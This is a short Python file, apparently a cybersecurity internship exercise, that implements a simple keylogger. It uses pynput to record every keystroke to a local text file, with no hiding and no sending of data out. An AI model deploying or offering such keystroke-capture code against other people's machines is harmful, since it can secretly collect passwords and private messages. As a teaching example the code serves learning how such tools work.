"""
Title       : Simple Keylogger
Author      : Larona B. Kwae
Date        : June 2025
PRODIGY_CS  : 04
Description : A keylogger program that records and logs keystrokes. 
""" 
# Import the keyboard module from the pynput library
from pynput import keyboard

# Define the name of the log file where keystrokes will be saved
log_file = "key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Try logging regular (alphanumeric) characters
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # If the key has no printable char (e.g., space, enter), log the key name instead
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    # Keeps the program running and listening until manually stopped (Ctrl + C)
    listener.join()
